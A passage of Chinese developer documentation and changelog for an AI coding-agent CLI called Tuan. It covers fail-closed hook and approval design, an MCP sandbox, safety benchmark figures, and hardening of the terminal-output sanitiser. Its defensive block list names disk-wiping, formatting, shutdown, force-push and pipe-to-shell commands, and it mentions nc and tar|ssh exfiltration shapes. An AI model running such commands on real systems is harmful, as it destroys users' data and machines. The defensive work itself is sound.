- **三条最值钱的修正**（均已实测，不是"对齐"本身）：
  1. **链式 `replace` 二次替换**：上游 `fill_migration_markdown` 先替换
     `{model_from}` 再替换 `{model_to}`；若 `current_model` 含字面量
     `{model_to}`（模型名来自服务端/配置，可被污染），会被二次替换成
     `target_model`。实测 `"从 {model_from} 迁移到 {model_to}"` +
     current `"old-{model_to}-x"` 上游产出 `"从 old-NEW-x 迁移到 NEW"`。
     本轮改为**单次正则扫描**，替换值不参与后续匹配；未知 `{...}`
     原样保留，不吞不展开。
  2. **发现失败不能静默当空**：上游 `collaboration_modes::list()` 把超时、
     RPC 错误、协议错误一律压成空 `Vec` + warn（模块头 "Missing discovery
     adds no presets"），调用方分不清「没查到」与「查了但没有」，一个
     网络错误会被当成「无需展示模式选择器」。`DiscoveryResult` 显式区分
     5 种状态，`usable` 只允许 `ok/empty`，强制调用方处理 `unavailable`。
  3. **`--add-dir` 不能静默丢弃**：上游只返回一句警告字符串让调用方
     "负责呈现"，忘了打印就等于静默忽略 —— 用户以为加了可写根、实际
     操作落空或落到别处。`AddDirDecision` + `enforce()` 把「忽略」升级
     为**结构化拒绝**，并做 `..` / 控制字符 / NUL / 空串校验。刻意**不
     做**「越出 cwd」判定：`--add-dir` 的本意就是加工作区外的可写根，
     把它当错误会与语义冲突，真正的边界在沙箱层。
- **两处几何一致性契约**：`choice_rows`（渲染分页）与 `choice_at`（命中
  测试）共用同一份 `height/visible/start` 计算；`TabStrip.hit` 与
  `render_plan` 共用 `targets()`。二者都提供 `*_matches_render()` 自检并
  进回归集 —— 否则会出现「点第 3 项却打开第 2 项」「点到的和看到的不
  一致」，在带权限的侧栏里会让用户误开另一个会话。另：`tab_width=0`
  显式返回空 targets 而非除零；CJK 显示宽度用 `east_asian_width`
  **近似**（如实标注，不声称逐字节一致）。
- **一条必须挑明的上游语义**：强制迁移（`can_opt_out=false`）下 Enter
  与 **Esc 都接受**，事件流耗尽也默认接受；可选模式下 `2` 才拒绝，且
  Esc 是「确认当前选中」而非取消。这与本项目审批覆盖层「无输入 / Esc
  绝不变成同意」的 fail-closed 契约**相反**。本轮原样保留上游既有键盘
  策略，但用 `policy_note()` 显式标注并写进文档：只适用于模型升级提示，
  **绝不套用到审批链路**。
- **硬约束延续**：`configkit_validate()` 调用第 12 轮的
  `corekit.app.assert_wiring_intact()`，确认 6 条既有安全接线
  （权限策略注入 / deny-all / `ctx.confirm` / 审批卡片 / 副本确认 /
  ABORT）仍全绿；`tuan tui parity` 仍显示「既有链路完好」。
  **本轮没有替换任何现有运行时对象**。
- 回归：`tests/test_tui_config_layer.py` **106 例**通过；
  `test_tui_parity.py` / `test_tui_input_layer.py` /
  `test_tui_core_app_layer.py` 指标同步到 10 / 93.9% / 55.8% / 21.2%，
  派生一致性校验保留。
- 下一轮：`streaming_async` + `tools_exec` + `history_transcript`（5），
  再往后剩余 5 个清零，仍**保留现有安全接线**。

**全模块超 Claude Code v2.1.319 计划 + B1（2026-11-07，第 14 轮）**

- 新增 `CLAUDE_PARITY.md`：14 域 / 99 模块 / 12 轮次的详细计划，
  上游锁定 **v2.1.319（2026-11-06）**。新增 `tuan_cli/parity_claude/`
  （目录 / 证据 / 六维探针 / 矩阵）与 `tuan claude parity`。
- **「超」有硬判据**：`fully_superior` 需同时满足 gap=0、六维运行时探针
  全 OK、每维至少 1 个已证实领先、所有 B 轮完成、第三方自适应红队背书。
  当前 **false**（26 个缺口、判据 5 项仅 2 项为真），判据写死不许放宽。
  六个探针真调现有代码：注入不存在的 hook 二进制、篡改 HMAC、
  喂畸形配置、写坏 MCP 策略看 locked、统计真实 i18n/README、
  校验 165 模块 Codex 矩阵。
- **B1 修两个真实 fail-open 侧门**（`hooks/manager.py`）：
  1. 四种 hook 执行器失败时一律 `return None`，`run_pre` 直接
     `continue` —— **安全 hook 自己挂了，命令照跑**。现在记录
     `HookFailure` + `failures()`，`hooks.on_failure` **默认 `block`**，
     阻断带结构化原因与 `failure_kind`；`allow` 是显式且留痕的逃生口。
     看门狗超时由主线程补记（thread-local 否则会被跨线程绕过）。
  2. `blocking` 默认 False → True：此前 hook 返回 `{"block": true}`
     若未显式声明 `blocking: true` 会被吞掉。`blocking` 只管 hook
     自身决策，不管执行失败的 fail-closed。
- `config/security_schema.py` 新增 `hooks.on_failure` 枚举校验，
  显式 `allow` 报安全降级。
- **行为变更如实标注**：依赖「hook 挂了也放行」的部署需显式配
  `hooks.on_failure: allow`；既有超时测试断言已更新并新增逃生口用例，
  **没有为变绿放宽策略**。
- **如实边界（最该看的一条）**：Tuan 仍缺 OS 级默认沙箱、网络默认拒、
  子进程凭据代理注入、worktree 创建路径的隔离证明，
  全部**明确列为 B2 缺口**，不因六维探针全绿而宣称安全边界已对齐。
  `not_applicable` 8 项如实标不适用，不包装成领先。
- **合规**：Claude Code 是 Anthropic 专有产品，本轮仅依据公开文档 /
  changelog / release notes 做行为契约对标，**未复制任何源码或商标资产**，
  Anthropic 不背书（`NOTICE` 第 14 条）。
- **硬约束延续**：`matrix.validate()` 调用
  `corekit.app.assert_wiring_intact()`，6 条既有安全接线全绿；
  B 线不碰 A 线 `tui/parity` 文件。
- 回归：`test_claude_parity.py` 58 例 + hooks 批次 27 例；
  下一轮 B2 处理 OS 沙箱 / 网络默认拒 / 凭据注入 / worktree 逃逸。




---

## 9. 测试与回归基准

核心安全回归文件（改动后必须全绿）：
`test_sandbox_system.py` / `test_mcp_checkpoint_convergence.py` / `test_security_network_ownership.py`
`test_permission_rules.py` / `test_security_integration.py` / `test_security_integration_tool_executor.py`
`test_security_hardening.py` / `test_security_auditor_provider.py` / `test_harden_network_policy.py`

> 注：`test_security_v2.py::TestSymlinkResolution` 为 Windows 环境相关、与安全逻辑无关的既有用例，不作为回归门槛。

---

## 10. 安全策略（黑名单 / 白名单 / 多阶段确认）

> 本节是安全**策略**层权威说明（架构见 §2-§4，实现细节见 `ext/safety_engine.py`）。
> 违反本策略的 PR 将被拒绝合并。

### 10.1 三层安全模型

1. **白名单** — 用户同意后自动执行的日常操作
2. **黑名单** — 绝对禁止的操作（无论什么模式）
3. **极高风险防护** — 最高级别的命令需要多重人工确认

**优先级关系：白名单 < 黑名单** — 即使一个命令在白名单中，如果命中黑名单模式，也绝不自动执行。

### 10.2 黑名单（硬红线，永不自动执行）

以下命令**无论什么模式**（YOLO / Plan / 普通）、**无论是否有确认通道**，都**绝不自动执行**——
`is_hard_redline()` 命中即直接拦截，不存在「放行」通道：

| 命令模式 | 描述 |
|---------|------|
| `rm -rf /` 或 `rm -r -f /` | 递归强制删除根目录 |
| `rm -rf /path/*` 含通配符递归删除 | 递归删除大量文件 |
| `dd if=... of=/dev/sda` | 直接写入磁盘设备 |
| `mkfs.*` | 创建文件系统（格式化） |
| `format C:` 等 | 格式化磁盘 |
| `wipefs` / `shred` / `> /dev/sdX` | 擦除磁盘数据 |
| `diskpart` / `cipher /w` / `bcdedit` / `reg delete` | Windows 磁盘/注册表级破坏 |
| `shutdown` / `halt` / `poweroff` / `reboot` | 系统关机/重启 |
| `init 0` / `init 6` | 系统关机/重启 |
| `systemctl poweroff` / `reboot` / `halt` | systemd 关机/重启 |
| `chmod -R 000 /` | 递归移除所有权限 |
| `chown -R root /` | 递归变更 root 所有权 |
| `git push --force` / `git push -f` / `+refspec` | 强制推送 |
| `find / -delete` | 递归删除文件 |
| `Remove-Item -Recurse -Force` | PowerShell 递归强删 |
| `Stop-Computer` / `Restart-Computer` | PowerShell 关机/重启 |

> **注**: SQL 破坏性操作（`DROP TABLE`、`DELETE FROM ...`、`TRUNCATE TABLE`）**不属于**硬红线——
> 它们归类为「可确认关键级」，不会自动执行，但存在确认通道时允许用户经**极端 5 次确认**人工放行
> （仅本次生效，不会自动加入白名单）。YOLO 模式或无确认通道时同样 fail-closed 硬拦截。

**红线判定通过 `is_redline()` 函数实现（单一来源）**，覆盖：
- Token 化判定（穿透子壳/变量/引号/解释器间接写法）
- 正则模式库（`_CRITICAL_PATTERNS` / `_HIGH_PATTERNS` / `_MEDIUM_PATTERNS`，与 `score()` 口径一致）
- 递归间接调用展开（最多 32 层，含解释器内联载荷穿透 `node -e` / `python -c` 包裹）
- PowerShell Base64 解码
- Unicode NFKC 归一化（含零宽字符剥除）

### 10.3 可确认关键级（SQL 破坏性操作，5 次警告）

以下 SQL 破坏性操作**不会自动执行**，但在非 YOLO 模式且存在确认通道时，允许用户经 **5 次警告**人工放行：

| 命令模式 | 描述 |
|---------|------|
| `DROP TABLE` | 删除数据表 |
| `DROP DATABASE` | 删除数据库 |
| `DELETE FROM table` 无 WHERE | 删除全部数据 |
| `TRUNCATE TABLE` | 清空数据表 |

**极高风险警告机制（可确认关键级）：**
- 弹窗 5 次，每次确认按钮在不同位置（右下→左上→中间底部→右上→左下）
- 每次弹窗间隔 ≥ 2 秒（防程序自动连续点击绕过）
- 任何一次取消 → 操作立即终止
- YOLO 模式或当前无确认通道 → 直接硬拦截（fail-closed）

### 10.4 高风险命令（HIGH，3 次警告）

以下命令**在 YOLO 模式下也不自动执行**，弹 **3 次警告**：

| 命令模式 | 描述 |
|---------|------|
| `chmod 777` | 全权限修改 |
| `git reset --hard` | 硬重置 |
| `git clean -f` | 删除未跟踪文件 |
| `git checkout -- .` | 丢弃所有工作区变更 |
| `docker rm -f` / `docker rmi -f` | 强制删除容器/镜像 |
| `kubectl delete` | 删除 K8s 资源 |
| `iptables -F` | 清空防火墙规则 |
| `ALTER TABLE ... DROP` | 修改表结构删除列 |
| 管道到 shell | `\| sh` / `\| bash` / `\| zsh` |

**高风险警告机制：** 弹窗 3 次，每次确认按钮在不同位置；任何一次取消 → 操作立即终止。

### 10.5 白名单（Trae 模式）

1. **手动授权**：用户通过 `tuan safe allow <command>` 将命令加入白名单
2. **白名单生效后**：同类操作**自动执行**，不再弹出确认（前缀匹配，如 `git status` 匹配 `git status --short`）
3. **用户随时可撤销**：通过 `tuan safe deny <cmd>` 撤销白名单
4. **白名单永远低于黑名单**：即使命令在白名单中，如果命中红线模式，**仍然拦截**
5. **红线命令无法加入白名单**：`is_redline` 命中的命令，`tuan safe allow` 会直接拒绝

> **注意**：用户在某次确认通道中「放行」的命令**仅本次生效**，不会自动写入白名单。
> 白名单存储在 `~/.tuan/whitelist.json`。

白名单管理命令：`tuan safe list`（查看）· `tuan safe allow <command>`（添加，红线命令会被拒绝）· `tuan safe deny <cmd>`（移除）· `tuan safe status`（查看安全系统状态，含白名单条目数与存储路径）。

### 10.6 月度更新（黑名单演进）

**每月第一个工作日**，团队必须 review 并更新黑名单：检查新攻击模式 / 新绕过方式 → 更新 `_CRITICAL_PATTERNS` / `_HIGH_PATTERNS` 正则库 → 更新本节命令列表 → 记录变更到 `CHANGELOG.md`。

### 10.7 验证机制（实时可用，非虚构接口）

```bash
tuan ext call safety score '{"command":"rm -rf /"}'
# 输出: { "risk": "critical", "score": 100, "block": true, "reasons": ["recursive force delete (递归强制删除)"], ... }

tuan ext call safety score '{"command":"ls -la"}'
# 输出: { "risk": "none", "score": 0, "block": false, "reasons": [], ... }
```

> **注**: 旧文档曾出现 `tuan safety check` 命令，该命令**不存在**（未实现），请使用上述 `tuan ext call safety score` 替代。

### 10.8 安全承诺

> 我们承诺：**任何情况下**，极高风险命令都不可能被自动执行。
> 即使 YOLO 模式、即使白名单包含、即使用户授权过——**5 次警告是底线，不可绕过。**

---

## 11. MCP 安全配置指南

MCP (Model Context Protocol) 安全机制提供多层防护，确保外部工具调用不会对系统造成危害。

### 11.1 工具权限控制

```yaml
mcp:
  servers:
    - name: filesystem
      command: npx
      args: ["-y", "@modelcontextprotocol/server-filesystem", "."]
      security:
        allowed_tools:        # 白名单模式: 只允许调用指定工具
          - read_file
          - list_directory
          - get_file_info
        denied_tools:         # 黑名单模式: 禁止调用指定工具
          - delete_file
          - write_file
          - move_file
        require_confirm_tools: # 需要用户确认的工具
          - write_file
          - delete_file
```

### 11.2 频率限制 / 超时与重试

```yaml
mcp:
  security:
    max_calls_per_minute: 60  # 每分钟最多 60 次调用
    audit_enabled: true       # 启用审计日志
  timeout: 30.0               # 全局超时 (秒)
  servers:
    - name: filesystem
      command: npx
      args: ["-y", "@modelcontextprotocol/server-filesystem", "."]
      timeout: 10.0           # 服务器级超时
      max_retries: 3
      retry_delay: 1.0
```

查看审计日志：`/mcp audit 20`（显示最近 20 条调用记录）。

### 11.3 沙箱隔离（进程级，无需 Docker）

对不受信任的 MCP server，启用 `security.sandbox: true` 后执行**进程级隔离**：

1. **环境脱敏**：server 子进程的环境变量中抹除密钥类变量（`API_KEY`、`SECRET`、`TOKEN`、`PASSWORD`、`TUAN_*`、`OPENAI*`、`AWS_*`、`DATABASE_URL` 等），防止密钥泄漏到 server。
2. **工作目录隔离**：server 子进程运行在临时空目录，无法读写工作区文件。
3. **调用前 fail-closed 安全闸门**：每次工具调用前，参数中的文本字段经 safety 引擎红线检测，命中 `rm -rf`、`DROP TABLE` 等危险操作**直接拒绝**，不发送给 server；闸门异常时同样保守拒绝。

> **注**: 本沙箱为「最小隔离」纵深防御：防密钥泄漏、防读写工作区、防危险参数调用。
> 它不是操作系统级/容器级隔离——若需更强隔离，请在操作系统层自行限制（如容器、最小权限用户）。

### 11.4 查看安全状态与故障排查

```
/mcp security  # 显示所有服务器的安全策略
/mcp list      # 显示已连接的服务器
/mcp tools     # 显示可用工具
/mcp audit     # 显示调用审计日志
```

- 工具调用被拒绝 → 检查 `/mcp security`（是否在黑名单中，或不在白名单中）。
- 超过频率限制 → `tuan config set mcp.security.max_calls_per_minute 120`（重启后生效）。
- **注**: `/mcp config` 命令**不存在**。调整 MCP 配置请使用 `tuan config set <key> <value>`，或直接编辑 `~/.tuan/config.yaml` 的 `mcp:` 段。
- 沙箱执行失败 → 检查 server `command`/`args` 是否可执行（`tuan mcp list`）；闸门拦截是预期行为（查 `/mcp audit` 中 `sandbox-gate-denied` 记录）；密钥被抹除导致行为异常时请在 server 的 `env:` 段显式声明（仍建议最小必要权限）。

### 11.5 最佳实践

1. **最小权限原则**: 只授予必要的工具权限
2. **启用审计**: 始终启用审计日志以便排查问题
3. **设置频率限制**: 防止意外的高频调用
4. **使用沙箱**: 对不受信任的服务器启用沙箱隔离
5. **敏感工具确认**: 对修改类工具启用用户确认
6. **合理超时**: 设置适当的超时时间避免长时间阻塞

---

## 12. 健康状态摘要（2026-09-06 体检）

> 本节为全项目体检结论的持久化摘要（原详细报告已归档删除）。版本 `0.2.014`。

### 12.1 安全引擎对抗基准（1 万条，seed=20260906）

| 指标 | 结果 |
|------|------|
| 该拦召回（must-block） | **100%**（7360/7360） |
| 漏放（bypass） | **0**（修复前 44） |
| 误报 | **1.87%**（23 例，仅硬拦 1.38%） |
| 放行准确率 | 98.13% |
| 裸命令拦截 / 误杀 | 100% / 0 |

剩余 23 例误报为 fail-closed 保守取舍（`nc` 端口探测、`tar|ssh` 外传形态、含字面危险串），非缺陷。

### 12.2 测试套件

- 完整套件近次：**2560 passed / 10 failed / 8 skipped**，10 个失败全部为环境/IPC 类（全量长跑下 IPC 瞬断、`test_cli_e2e.py` CLI 入口夹具未装），非代码回归。
- 安全 / 安全相关测试 25 个文件整体复跑：**715 passed / 1 skipped**，安全引擎改动零回归。

### 12.3 已修复记录（2026-08-30 起）

| # | 缺陷 | 修复 |
|---|------|------|
| F1 | `pyproject.toml` 依赖清单缺失（pydantic/openai/typing_extensions/tomli/fastapi 等未声明） | 新增 `mcp`/`backend` optional-extras + `tomli; python<3.11` 条件依赖 |
| F2 | `doctor` 误判 openai 为必装 | openai 移入 optional 集合并改描述为「可选」 |
| F3 | `install.ps1` 解析到无 pip 的 uv 解释器装出废 venv | 探测「带 pip 的 python」+ `ensurepip` 引导 |
| F4 | `MCPPlugin._register_tool` 签名不一致 | 对齐实现与内部调用，`test_mcp_tool_bridge` PASS |
| F5 | Hooks 默认超时 5s 过紧，审计日志写不出 | `default_timeout` 5s → 30s |
| F6 | Hooks 超时强杀在 Windows 挂死 | 看门狗线程 + 进程树强杀（`taskkill /T` / `killpg`） |

### 12.4 待办（非阻塞，环境类）

- IPC 稳定性（进程/端口复用、引擎常驻连接池）：全量长跑偶发瞬断。
- `tests/test_cli_e2e.py` CLI 入口夹具：`_tuan_bin()` 解析的 `run` 控制台脚本不存在。

---

---

## 13. 运行时标语（spinner verbs）与 TUI 状态口径修复

新增 `tuan_cli/tui/runtime_slogans.py`，在顶部 HUD 的 Codex 风格 Working
状态行旁挂 Claude Code 同款运行时标语（10 语言，中文保留「磨洋工 /
腌制入味 / 看报纸中」梗）。安全相关要点：

- **自定义词是终端输出，必须净化**：`sanitize_verb()` 去掉 OSC 8 超链接、
  CSI 颜色/清屏序列、C0/C1/DEL 控制字符，按显示列宽（CJK 算 2 列，上限 40）
  截断。这延续 `tui/inputkit/terminal_hyperlinks.py` 的教训 —— 终端会解释
  执行 OSC/CSI，上游 `web()` 不校验目的地，标语走的是同一条输出通道。
- **配置 fail-safe 而非 fail-closed**：`~/.tuan/settings.json` 的
  `spinnerVerbs` 写错（非法 mode / verbs 非列表 / 数字越界 / JSON 损坏）一律
  回落出厂配置并在 `source` 标注 `invalid:*`，不让 TUI 崩、也不静默生效。
  这里不涉及安全裁决，故不需要 fail-closed 拒绝命令。
- **文案由真实事件驱动**：只有 `submit` / 流式分片 / `begin_tool` 才推进；
  `render()` 纯读。忙碌中超过 `stall_ms` 无事件显示「疑似摸鱼」诊断 —— 这是
  **启发式可观测提示**，不是心跳、超时控制或安全闸门，不触发中断/重试，
  也不改变任何裁决。
- 顺带修 `_render_footer` 工具名死分支、统一两套宽度算法、修正
  「wcwidth 是 C 实现」的错误注释。主线 `_line_heights` 已有高度缓存，
  本地分叉副本的性能数字不适用于主线。详见 `RUNTIME_SLOGANS.md` §6。

回归：`tests/test_runtime_slogans.py` 57 例全绿。合规：Claude Code 为专有产品，
仅依据公开资料做行为对标，**未复制任何源码**（`NOTICE` 第 15 条，Anthropic
不背书）。本轮**未新增 CLI 子命令**，`CLAUDE_PARITY.md` 的 99 模块基线与
`fully_superior=false` 均未改动。

---

## 14. 深度轮：并发安全、证据脱敏与配置语义

本轮不扩功能广度，只深化运行时标语（§13）。三点与安全直接相关：

- **并发正确性**：`note_activity` 从 UI / 模型 / 工具线程并发进入，
  `render` / `liveness` 从动画 invalidate 线程进入。上版五个可变字段
  无锁复合读写，会出现「新 seq + 旧文案」撕裂与间隔判断读到半更新
  时间戳；现在全部在 `RLock` 内线性化，并对乱序事件/时钟回拨做
  单调化钳制。8 线程 × 2400 次并发用例以 `(seq, verb)` 配对抓撕裂。
- **证据脱敏**：新增的环形证据链只记阶段、事件类型、`monotonic` 时间、
  序号、当前已净化文案，以及 detail 的**长度与字符类别**；
  **绝不记 detail 原文**（可能是工具参数、路径、token）。证据只在
  进程内存，不落盘、不上传、不进审计日志。
- **配置 fail-safe 语义收紧**：未知阶段键（如拼错 `stremaing`）整段拒绝
  而非静默忽略 —— 用户以为收紧了预算、实际没变，是危险的假安全感。
  另修一个真实缺陷：「没写 `mode`」旧逻辑一律当 `append` 又强制
  `verbs` 非空，导致只配 `stall_ms` 的合法配置被判
  `invalid:empty-verbs` 静默回落出厂值。现在按是否给了 `verbs` 推断。

**边界不变**：`stall` 仍是启发式可观测提示，不是安全闸门、心跳或超时
控制，不触发中断/重试、不改变任何裁决；`slow` 只是视觉降级；
`reload()` 需显式调用、非法配置保留旧配置；`_animate` 明令禁止刷新
活性时间戳。验证：93 例 pytest + 22 项纯 stdlib 独立验证全绿。

---

## 15. 深度轮 2：净化边界与宽度真值

本轮不扩功能广度，只修运行时标语（§13–§14）的净化层与呈现层。
安全相关四个点：

- **bidi 覆写是真实攻击面**：旧 `sanitize_verb` 原样输出
  `U+202E RLO` / `U+202D LRO` / `U+2066..2069` isolate 以及 ZWSP/ZWJ/
  BOM/WJ/软连字符/私用区/未分配码点。终端会按 bidi 控制字符重排显示
  方向，用户看到的文案与字符串内容不一致（Trojan Source 的 UI 版）。
  现在按 Unicode 通用类别删 `Cc/Cf/Cs/Co/Cn`，并删除变体选择符。
- **ESC 序列要整段剥**：旧版只删 ESC 字节，把 `ESC ( B` / `ESC c` /
  `ESC 7` 的参数字符留在文案里。现在 OSC → CSI → 通用 ESC → C0/C1
  四步完整消费，输出保证不含 ESC。
- **净化幂等是构造出来的**：迭代到不动点，最多 3 轮，不收敛
  fail-closed 返回空串；500 串 fuzz 0 例不幂等。
- **内置诊断文案也曾是侧门**：上一轮文档说「header 只显示短文案」，
  实际把约 52 列的完整 `_STALL_TEXT` 直接塞进单行 header，且绕过了
  净化层的宽度/不可见字符约束。现在自定义 verbs 与内置诊断共用
  `_fit_headline()` 单一出口（净化 + 40 列），完整信息留在
  `Liveness.diagnostic`。

另补配置层严格化：1 MiB 读取上限，拒绝 `bool` 冒充 `int`、字符串
数字、浮点截断与 `NaN`/`Infinity`。自定义 verbs 与 10 语言内置词库
共用同一套净化/列宽不变量并已自检。

**边界不变**：`stall` 仍是启发式可观测提示，不是安全闸门、心跳或超时
控制，不触发中断/重试、不改变任何裁决；证据链仍在进程内存且脱敏；
`_animate` 仍禁止刷新活性。VS16 被删会让 emoji 呈现退化成文本样式，
是「宽度可预测」的刻意取舍。验证：139 例 pytest + 20 项纯 stdlib
独立验证全绿。

---

## 16. 每个标语都要对应的：严格分发与告警不降级

本轮把用户提供的 860 条标语库接到真实运行时事件上。三点与安全直接相关:

- **未知事件 fail-closed**: 旧 `pick("totally.unknown")` 静默返回
  `'Here.'` —— 一条没有任何对应事件的标语被渲染。现在
  `pick_for_event` 抛 `UnboundSloganEvent`, `pick_strict` 对未知上下文
  抛异常; `audit()` 逐条核验 `orphan_slogans=0` /
  `contexts_without_event=0` / `events_without_pool=0`。
- **结构化告警不降级**: 用户库设计稿原文「不要动: 安全拦截的结构化
  告警 (那是降级, 不是优化)」变成 `SECURITY_EVENTS` 的运行时契约 ——
  6 类安全事件一律返回空文案 + `security-notice`,
  `audit().unsafe_bindings` 断言它们绝不被绑上标语。
  这是把一句注释变成了可执行边界。
- **净化只有一份**: 前两轮 (§13–§15) 做成的净化层抽到
  `tuan_cli/ui/slogans/_clean.py`, 活性引擎 re-export **同一函数对象**
  (`sanitize_verb is _clean.sanitize_verb` → True)。1108 条词条全部
  过同一出口, `audit().clipped_slogans=0` 且 `sanitizer_shared=True`;
  不产生第三套宽度/净化真值。3 条超长内置文案 (会被截成半句)
  显式换成语义完整的短版并留痕。

另修 picker 的并发与配置缺陷: 裸 `dict` → `RLock` 线性化;
`min_interval` 拒绝 `-1/NaN/Inf/"5"/True` (旧版 `Inf` 让 spinner 永不
换词); 窗口改真 LRU 且尺寸变化保留历史。分发日志有界 64 条且脱敏,
只记事件 / 上下文 / 原因 / 来源 / 序号。

**边界不变**: `stall` 仍是启发式可观测提示, 不是安全闸门; TUI 只建立
分发与留痕, 未替换既有 i18n 文案; 不是真机长跑; 第三方自适应红队仍未做。
验证: 175 例 pytest + 26 项纯 stdlib 独立验证全绿。

---

## 17. 运行时闭环：错误不静默、留痕可反查、安全告警仍不降级

本轮不改安全裁决，只把上一轮「每个标语都要对应的」在运行时做实。
三点与安全直接相关：

- **错误不再静默**：`_slogan_dispatch` 原本 `except Exception: return None`，
  拼错事件时 `pick_for_event` 抛的 `UnboundSloganEvent` 被吃掉、日志零记录。
  现在未知事件与库异常都走 `_slogan_error()` 记 `error:<kind>` 留痕，
  `slogan_errors()` 可直接查；`strict=True` 时异常向上抛（开发/测试）。
  生产默认不掀 UI，但**绝不静默吞掉** —— 静默失败是安全观察里最该避免的。
- **留痕可反查且按会话隔离**：`_slogan_log` 现在带 `entry_id`，
  `slogan_trace()` 可反查到「这条标语由哪个事件组触发」；日志按
  `owner` 分桶并加 `RLock`，`reset_dispatch_log(owner)` 不再清掉
  另一会话的记录。快照返回 `tuple` 而非内部可变对象。
- **安全告警仍不降级**：6 类 `SECURITY_EVENTS` 依旧返回空 +
  `security-notice`，`audit().unsafe_bindings` 仍为 0。
  空串既表示「安全事件」也表示「出错」，现在靠 `slogan_trace().reason`
  区分（`security-notice` vs `error:*`），不靠猜。

另修两处性能/正确性热路径：`audit()` 的 O(n²) `ids.count(i)` →
`Counter`，且 1695 条词条的净化检查挪到索引构建时缓存；
`pick_for_event` 的线性反查 → `_BY_ID`/`_BY_TEXT` O(1) 索引。
新增第 11 项不变量 `index_consistent`。`SloganEntry.events` 解决
`model.streaming` / `turn.retry` 共享上下文时的归属歧义。
`rng`/`now`/`owner` 注入使分发可确定性回放（注入 rng 时用一次性
局部避重窗口，避免全局隐藏状态污染回放）。

**如实边界**：`setswitchinterval(1e-6)` + 12 线程压测**未复现**日志长度
超限，加锁是消除对 GIL 实现细节的依赖，不是修了已观测故障；
20 次 `audit()` 仍有 355.6 ms 的 `pool_entries` 开销，未加第二层缓存
（避免审计结果依赖缓存时间点）；`stall` 仍不是安全闸门；TUI 未替换
既有 i18n 文案；不是真机长跑；第三方自适应红队仍未做。

验证：194 例 pytest + 42 项纯 stdlib 独立验证 + 22/20 项上轮脚本全绿。

---

## 18. 闭环补漏：不可反查的标语不再显示，错误在两层都可见

本轮不改任何安全裁决，只补上一轮刚修完的运行时对应关系里的漏洞。
三点与安全直接相关：

- **不可反查的标语 fail-closed**：上一轮 `_BY_TEXT` 用原始文案建索引、
  分发却拿净化后文案反查。当前 `clipped=0` 让两者碰巧一致，注入一条
  含 ZWSP 的词条后实测 `reason='ok'` 但 `entry_id=''` —— 对应关系
  静默断裂。现在分发走 `_BY_CLEAN`（净化后索引），未命中即
  `index-miss` + **空文案** + `_INDEX_MISSES` 计数，不渲染来源不明的
  文案；净化后文案撞车也会被检测并记入 `_CLEAN_COLLISIONS`。
- **错误在两层都可见**：上一轮 `_slogan_error()` 只写 TUI 实例日志，
  实测 `mapping.dispatch_log()` 里错误相关 0 条。现在
  `record_error()` 同步进全局日志，`slogan_errors()` 与
  `dispatch_log(owner)` 一致。6 类 `SECURITY_EVENTS` 仍返回空 +
  `security-notice`，`audit().unsafe_bindings` 仍为 0，**不与
  `error:*` 混**；`strict=True` 抛异常时照样两层留痕。
- **日志规模有界**：`_dispatch_log` 从「只限每桶长度」改为 LRU
  `OrderedDict` + `_MAX_OWNERS=128`；`close()` 释放自己的桶；
  `dispatch_log_stats()` 可核验桶数 / 决策总数 / 单桶峰值。
  实测 2000 个会话后 `owners=128`。

另修两处工程正确性：`_MAX_WINDOWS` 从 64 改为按真实 key 空间算的
384（实测 64 会让 320 个 key 互相驱逐，避重失效）；
`audit().index_consistent` 加严为三份索引全等、无撞车、运行时零
miss、触发事件组完整；`AuditReport` 新增 `clean_collisions` /
`runtime_index_misses` / `dispatch_stats` 并纳入 `ok`。

**如实边界**：`index-miss` 的 fail-closed 只影响「显示不显示标语」，
不改变任何裁决；`release_owner()` 只释放全局桶，实例内
`_slogan_log` 仍随对象驻留；`_MAX_OWNERS=128` /
`_MAX_WINDOWS=384` 是有界折中，最久未用历史仍会被淘汰；并发压测
仍未复现 list 撕裂（同 §17）；不是真机长跑；分叉改动仍未合并；
第三方自适应红队仍未做。冷/热态 `audit()` 的数字差异是测量口径，
**不宣称性能提升**。

验证：215 例 pytest + 52 项纯 stdlib 独立验证 + 22/20 项上轮脚本全绿。

---

## 19. 日志字段净化、自愈与证据保全

本轮不改任何安全裁决，只补前三轮刚修完的运行时对应关系里的漏洞。
四点与安全直接相关：

- **日志字段不再是可注入通道**：`record_error()` 的 `event` / `kind` /
  `context` 是 public API 入参。实测注入 5030 码点含 `ESC ]8;;` 超链接
  与 `U+202E` RLO 的串，旧实现原样写进两层日志；异常消息还会进
  traceback。现在 `_clean.sanitize_log_field()` 统一净化，与 UI 文案
  共用 `_clean_once` 清理核心（不产生第二套净化真值），TUI 降级路径
  也先过 `_clean` 再写。实测 5030 → 121 码点，ESC/RLO/OSC8 全清，
  两层留痕的 `event` 完全一致。
- **审计自愈但不丢证据**：上一轮 `audit().ok` 依赖累计
  `_INDEX_MISSES`，一次已修复的历史 miss 让健康状态永久报不健康；
  而唯一恢复手段 `reset_runtime_counters()` 强绑
  `reset_dispatch_log()`（实测 `decisions: 21 → 0`）。现在区分
  **连续**未处置 miss（fatal，一次成功反查即归零）与**累计**历史
  证据（信息项，永不自动清零）；`acknowledge_runtime_misses()` 显式
  确认且不动日志；`reset_runtime_counters()` 默认不清日志，
  需显式 `include_dispatch_log=True`。
- **会话退出证据保全**：`close()` 先记 `session.exit` 再删桶，
  全局日志永远缺该事件。现在先把整桶快照封存到实例
  `slogan_closed_trace()`，再释放全局桶（128 桶上界不变），
  两层口径一致且桶数仍有界。
- **LRU 读刷新**：只有写入刷新 LRU 时，高频只读的活跃会话会被当
  最久未用淘汰。现在 `dispatch_log(owner)` 指定 owner 时刷新；
  **无参全量读刻意不刷新**，否则一次全量读会刷活所有桶、淘汰策略失效。

另修两处工程正确性：`clipped`（文案需净化）降为信息项，真正 fatal
的是 `unrenderable`（净化后为空/仍超宽）与净化撞车；分发侧去掉
二次按码点截断，与 `_BY_CLEAN` 索引共用 `sanitize_verb` 单一出口，
避免超长词条静默 `index-miss`。

**如实边界**：`unresolved_misses` 是连续语义，间歇性 miss 会被随后
成功归零，累计值才是完整历史；`slogan_closed_trace()` 只保全
`close()` 那一刻的快照；`sanitize_log_field` 按码点限长而非列宽
（日志不参与终端渲染）；`index-miss` 的 fail-closed 只抑制标语显示、
不改裁决；并发压测仍未复现 list 撕裂；不是真机长跑；分叉改动仍未
合并；第三方自适应红队仍未做。

验证：234 例 pytest + 64 项纯 stdlib 独立验证 + 22/20 项上轮脚本全绿。

---

## 20. owner 全链路归一、被动淘汰留痕、单一释放出口

